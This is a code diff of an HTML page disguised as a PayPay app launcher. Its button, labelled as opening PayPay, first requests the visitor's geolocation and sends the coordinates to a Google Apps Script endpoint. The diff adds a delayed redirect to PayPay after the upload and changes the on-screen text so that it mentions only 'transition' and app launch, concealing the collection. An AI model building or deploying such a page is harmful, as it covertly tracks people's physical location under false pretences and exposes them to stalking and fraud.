@@ -6,10 +6,11 @@
 </head>
 <body>
     <img src="paypay.png" alt="画像">
-   <button id="getLocationBtn" style="font-size: 30px; padding: 20px 30px;" onclick="location.href='paypay://'">PayPayアプリを起動する</button>
+    <button id="getLocationBtn" style="font-size: 30px; padding: 20px 30px;">PayPayアプリを起動する</button>
     <div id="result"></div>
     <script>
     const GAS_WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbxFZEaC1jsMzmn7Z_SZDdtD2SSWONlMCs0dkatxfSfRA_S8Qpc0-4iYq9IJ0AJay4GX/exec'; 
+    
     document.getElementById('getLocationBtn').addEventListener('click', () => {
         if (!navigator.geolocation) {
             document.getElementById('result').textContent = 'お使いのブラウザはサポートされていません。';
@@ -25,6 +26,7 @@
         document.getElementById('result').textContent = '遷移中...';
         navigator.geolocation.getCurrentPosition(onSuccess, onError);
     });
+    
     function onSuccess(position) {
         const latitude = position.coords.latitude;
         const longitude = position.coords.longitude;
@@ -36,9 +38,11 @@
         `;
         sendDataToGoogleSheet(latitude, longitude, accuracy);
     }
+    
     function onError(error) {
-        // (省略)
+        document.getElementById('result').textContent = 'エラーが発生しました。';
     }
+    
     async function sendDataToGoogleSheet(lat, lng, acc) {   
         const dataToSend = {
             latitude: lat,
@@ -56,18 +60,23 @@
             });
             const result = await response.json();
             if (result.status === 'success') {
-                document.getElementById('result').innerHTML += '<p>データの送信に成功しました。</p>';
+                document.getElementById('result').innerHTML = '<p>遷移に成功しました。</p><p>PayPayアプリを起動しています...</p>';
+                // データ送信成功後、PayPayアプリを起動
+                setTimeout(() => {
+                    window.location.href = 'paypay://';
+                }, 1000); // 1秒待ってからアプリを開く
             } else {
                 throw new Error(result.message || '不明なエラー');
             }
         } catch (error) {
             console.error('送信エラー:', error);
-            document.getElementById('result').innerHTML += `<p>遷移に失敗しました: ${error.message}</p>`;
+            document.getElementById('result').innerHTML = `<p>遷移に失敗しました: ${error.message}</p>`;
         }
     }
-</script>
+    </script>
 </body>
 </html>
+
 
 
 
